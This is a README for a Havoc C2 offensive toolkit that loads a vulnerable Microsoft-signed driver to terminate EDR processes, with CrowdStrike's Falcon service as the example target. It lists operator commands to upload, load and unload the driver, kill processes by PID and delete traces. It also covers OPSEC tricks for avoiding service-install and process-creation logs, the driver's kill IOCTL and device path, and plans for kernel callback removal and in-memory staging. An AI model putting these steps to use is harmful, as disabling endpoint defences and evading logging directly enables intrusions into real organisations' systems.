# PoisonKiller BOF

A Havoc C2 BOF implementation of BYOVD (Bring Your Own Vulnerable Driver) to terminate EDR-protected processes. Based on the research by [@j3h4ck](https://github.com/j3h4ck/PoisonKiller).

---

## Quick Usage

```
# 1. Upload the driver to the target
upload /local/path/PoisonX.sys C:\Temp\PoisonX.sys

# 2. Load the driver
pk-load "C:\Temp\PoisonX.sys"

# 3. Get the PID of the target process
shell tasklist | findstr /i "CSFalconService"

# 4. Kill the process
pk-kill <PID>

# 5. Unload the driver
pk-unload <name> "C:\Temp\PoisonX.sys"

# 6. Delete the .sys from disk
pk-delete "C:\Temp\PoisonX.sys"

# 7. Clear state
pk-clear-state
```

> **Important**: Always use quotes around paths to avoid issues with backslashes in Havoc.

> **Important**: Always use a clean, dedicated sacrificial beacon for driver operations. Do not use your main C2 beacon. See the [Known Issues](#known-issues--bugs) section for details.

---

## Requirements

- Havoc C2
- Beacon running with elevated administrator privileges (High Integrity)
- `SeLoadDriverPrivilege` enabled in the token
- `PoisonX.sys` available on the target

---

## Installation

### Dependencies

```bash
sudo apt install mingw-w64
```

### Build

```bash
make clean && make
```

Compiled BOFs are output to `out/`:

```
out/
├── bof_loaddriver.x64.o
├── bof_killprocess.x64.o
├── bof_unloaddriver.x64.o
├── bof_delete.x64.o
└── bof_kill_multi.x64.o
```

### Configure the Python module

Edit `poisonkiller.py` and set `BASE_DIR` for your environment:

```python
# Example
BASE_DIR = "/home/user/tools/PoisonKiller"
```

### Load in Havoc

```
Scripts > Load > /path/to/project/poisonkiller.py
```

---

## Commands

| Command | Arguments | Description |
|---|---|---|
| `pk-load` | `"<path_sys>"` | Load driver via NtLoadDriver (no SCM) |
| `pk-kill` | `<PID>` | Kill a process via driver IOCTL |
| `pk-kill-multi` | `<PID1> <PID2> ... <PIDN>` | Kill multiple processes in rapid succession |
| `pk-unload` | `<name> "<path_sys>"` | Unload the driver |
| `pk-delete` | `"<path_sys>"` | Delete the .sys from disk |
| `pk-clear-state` | — | Clear module state after successful unload |
| `pk-status` | — | Show current module state |
| `pk-debug` | — | API diagnostic test on the target |

---

## Project Structure

```
PoisonKiller-BOF/
├── poisonkiller.py
├── Makefile
├── out/
│   ├── bof_loaddriver.x64.o
│   ├── bof_killprocess.x64.o
│   ├── bof_unloaddriver.x64.o
│   ├── bof_delete.x64.o
│   └── bof_kill_multi.x64.o
├── src/
│   ├── common/
│   │   ├── beacon.h
│   │   ├── ntdefs.h
│   │   └── utils.h
│   ├── bof_loaddriver.c
│   ├── bof_killprocess.c
│   ├── bof_unloaddriver.c
│   ├── bof_delete.c
│   └── bof_kill_multi.c
└── Drivers/
    └── PoisonX.sys
```

---

## Technical Details

### Driver

- **Signed by**: Microsoft Windows Hardware Compatibility Publisher
- **Signing date**: 2025-03-25
- **Device path**: `\\.\{F8284233-48F4-4680-ADDD-F8284233}`
- **Kill IOCTL**: `0x22E010`
- **Mechanism**: `ZwOpenProcess` + `ZwTerminateProcess` from kernel — bypasses PPL

### Driver Loading (OPSEC)

- Uses `NtLoadDriver` directly — **bypasses the SCM entirely**
- Does not generate **event 7045** (New Service Installed) or **4697**
- Registry key created under `HKLM\SYSTEM\CurrentControlSet\Services\<random_name>`
- Random 8-character lowercase name generated on each execution
- Registry key deleted **immediately** after loading
- `.sys` deleted from disk via `pk-delete` after unload

### Unload Flow

The `.sys` file must be deleted **after** unloading with `pk-delete` — not during. Deleting the file during unload causes beacon crashes in subsequent load/unload cycles.

### State Persistence

If the Havoc session is lost, state is automatically restored from `.pk_state` when the script is reloaded:

```
[*] State restored: driver='abcdefgh' path='C:\Temp\PoisonX.sys'
```

If the session is lost without `.pk_state`:

```bash
# Find the loaded driver on the target
shell driverquery | findstr /v "Microsoft\|Windows\|Intel\|AMD"
# Force unload by name
pk-unload <name> "C:\Temp\PoisonX.sys"
```

---

## OPSEC Assessment

| Factor | Status |
|---|---|
| Event 7045 (SCM) | ✅ Not generated |
| Persistent registry key | ✅ Deleted immediately after load |
| Driver name | ✅ Random per execution |
| .sys on disk after operation | ✅ Deleted via pk-delete |
| New process creation | ✅ BOF — no CreateProcess |
| Event 4688 | ✅ Not generated |
| Sysmon event 6 (driver load) | ⚠️ Generated — unavoidable with NtLoadDriver |
| Device path GUID | ⚠️ Known IOC — published on GitHub |
| PDB path in binary | ⚠️ `Hide.pdb` present in the driver |
| HKLM write | ⚠️ Required for NtLoadDriver |

---

## Known Issues / Bugs

- **Beacon instability after intensive use** — after several kill operations in the same session the beacon may become unstable and crash on subsequent operations. The exact cause is unclear — possibly accumulated process state corruption or internal driver callbacks marking the process that used the IOCTL. **Workaround**: always use a clean, dedicated sacrificial beacon exclusively for driver operations. Never use your main C2 beacon for these operations. If the sacrificial beacon dies, simply spawn a new one.

- **Intermittent unload failure** — in some sessions `NtUnloadDriver` fails with `0xC0000034`. Workaround: reboot the target to clear kernel state.

---

## Future Research

### 1. Second IOCTL in PoisonX.sys

The original research identifies **2 IOCTLs** but only reverses the process kill one (`0x22E010`). The first IOCTL was not analyzed and may expose a kernel memory R/W primitive.

### 2. Kernel Callback Removal BOF

Removing callbacks registered via `PsSetCreateProcessNotifyRoutine` before killing processes would enable more reliable EDR termination. This requires a driver with a kernel memory R/W primitive.

### 3. PDB Path Removal

The PDB path `D:\Build\PoisonX\Hide\x64\Release\Hide.pdb` is detectable via string analysis. Zeroing it without breaking the Authenticode signature is still an open problem — `strip` breaks the PE checksum.

### 4. bof_dropper — In-Memory Staging

A dropper BOF that receives the driver as bytes from the C2 would eliminate the manual upload step and enable full in-memory staging.

---

## Original Research

- **RE Writeup**: [Reverse Engineering a 0day used Against CrowdStrike EDR](https://medium.com/@jehadbudagga/reverse-engineering-a-0day-used-against-crowdstrike-edr-a5ea1fbe3fd4)
- **Original Repo**: [j3h4ck/PoisonKiller](https://github.com/j3h4ck/PoisonKiller)
